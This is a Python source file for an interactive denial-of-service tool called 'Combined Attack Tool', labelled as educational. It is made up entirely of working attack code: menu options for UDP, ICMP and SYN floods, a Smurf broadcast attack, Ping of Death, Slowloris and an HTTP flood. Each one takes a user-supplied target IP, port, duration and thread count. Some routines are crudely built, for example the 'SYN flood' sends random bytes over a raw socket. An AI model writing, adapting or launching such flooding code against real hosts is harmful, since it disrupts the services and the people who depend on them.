import os
import sys
import socket
import random
import time
from termcolor import colored
from threading import Thread, Lock

# Farben definieren
COLORS = {
    "menu": "yellow",
    "info": "cyan",
    "success": "green",
    "error": "red"
}

# Banner anzeigen
def show_banner():
    os.system("clear")
    print(colored("""
    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║  ██║
   ███████║   ██║      ██║   ███████║██║     ███████║
   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔══██║
   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██║
   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """, COLORS["error"]))
    print(colored("*******************************************", COLORS["menu"]))
    print(colored("*            Combined Attack Tool         *", COLORS["menu"]))
    print(colored("*         Created for Educational Use     *", COLORS["menu"]))
    print(colored("*******************************************", COLORS["menu"]))
    print(colored("Author: Educational Example", COLORS["success"]))
    print(colored("Usage of this tool must comply with all laws.", COLORS["info"]))
    print()

# Hilfsfunktionen
def get_target_info():
    ip = input(colored("Enter target IP: ", COLORS["info"]))
    port = int(input(colored("Enter target port (0 if not applicable): ", COLORS["info"])))
    duration = int(input(colored("Enter attack duration (seconds): ", COLORS["info"])))
    return ip, port, duration

def get_threads():
    threads = int(input(colored("Enter number of threads (Max: 100): ", COLORS["info"])))
    return min(threads, 100)

# Universal-Angriffs-Funktion
def execute_attack(ip, port, duration, threads, attack_type, payload=None):
    lock = Lock()
    stats = {"packets_sent": 0}

    def attack():
        nonlocal stats
        sock_type = socket.SOCK_DGRAM if attack_type in ["udp", "chargen"] else socket.SOCK_RAW
        sock = socket.socket(socket.AF_INET, sock_type)
        timeout = time.time() + duration

        while time.time() < timeout:
            try:
                data = payload or random._urandom(1024)
                sock.sendto(data, (ip, port))
                with lock:
                    stats["packets_sent"] += 1
            except Exception:
                continue

    print(colored(f"Starting {attack_type.upper()} attack on {ip}:{port}", COLORS["menu"]))
    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    while any(thread.is_alive() for thread in threads_list):
        with lock:
            print(colored(f"Packets sent: {stats['packets_sent']}", COLORS["info"]), end="\r")
        time.sleep(1)

    for thread in threads_list:
        thread.join()
    print(colored(f"\n{attack_type.upper()} attack completed.", COLORS["success"]))

# Spezifische Angriffe
def icmp_flood(ip, duration, threads):
    execute_attack(ip, 0, duration, threads, "icmp", b"\x08\x00" + random._urandom(32))

def syn_flood(ip, port, duration, threads):
    execute_attack(ip, port, duration, threads, "syn", random._urandom(1024))

def smurf_attack(ip, broadcast_ip, duration, threads):
    execute_attack(broadcast_ip, 0, duration, threads, "smurf", b'\x08\x00' + random._urandom(32))

def ping_of_death(ip, duration, threads):
    execute_attack(ip, 0, duration, threads, "pod", b'\xff' * 65507)

def slowloris(ip, port, duration, threads):
    lock = Lock()
    stats = {"connections_made": 0}

    def attack():
        nonlocal stats
        timeout = time.time() + duration
        headers = f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: keep-alive\r\n\r\n"

        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                sock.send(headers.encode())
                with lock:
                    stats["connections_made"] += 1
                time.sleep(random.uniform(5, 15))
            except Exception:
                continue

    print(colored(f"Starting Slowloris attack on {ip}:{port}", COLORS["menu"]))
    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    for thread in threads_list:
        thread.join()
    print(colored(f"\nSlowloris attack completed. Connections made: {stats['connections_made']}", COLORS["success"]))

def http_flood(ip, port, duration, threads, rps):
    lock = Lock()
    stats = {"requests_sent": 0}

    def attack():
        nonlocal stats
        timeout = time.time() + duration
        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode()
                sock.send(request)
                with lock:
                    stats["requests_sent"] += 1
                time.sleep(1 / rps)
            except Exception:
                continue

    print(colored(f"Starting HTTP Flood attack on {ip}:{port} at {rps} RPS", COLORS["menu"]))
    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    for thread in threads_list:
        thread.join()
    print(colored(f"\nHTTP Flood attack completed. Requests sent: {stats['requests_sent']}", COLORS["success"]))

# Hauptmenü
def main():
    while True:
        show_banner()
        print(colored("1. UDP Flood", COLORS["menu"]))
        print(colored("2. ICMP Flood", COLORS["menu"]))
        print(colored("3. SYN Flood", COLORS["menu"]))
        print(colored("4. Smurf Attack", COLORS["menu"]))
        print(colored("5. Ping of Death", COLORS["menu"]))
        print(colored("6. Slowloris", COLORS["menu"]))
        print(colored("7. HTTP Flood", COLORS["menu"]))
        print(colored("8. Exit", COLORS["error"]))

        choice = input(colored("Select an option: ", COLORS["info"]))

        if choice in ["1", "2", "3", "4", "5", "6", "7"]:
            ip, port, duration = get_target_info()
            threads = get_threads()

            if choice == "1":
                execute_attack(ip, port, duration, threads, "udp")
            elif choice == "2":
                icmp_flood(ip, duration, threads)
            elif choice == "3":
                syn_flood(ip, port, duration, threads)
            elif choice == "4":
                broadcast_ip = input(colored("Enter broadcast IP: ", COLORS["info"]))
                smurf_attack(ip, broadcast_ip, duration, threads)
            elif choice == "5":
                ping_of_death(ip, duration, threads)
            elif choice == "6":
                slowloris(ip, port, duration, threads)
            elif choice == "7":
                rps = int(input(colored("Enter requests per second (RPS): ", COLORS["info"])))
                http_flood(ip, port, duration, threads, rps)
        elif choice == "8":
            print(colored("Exiting... Goodbye!", COLORS["error"]))
            sys.exit()
        else:
            print(colored("Invalid choice. Please try again.", COLORS["error"]))

if __name__ == "__main__":
    main()
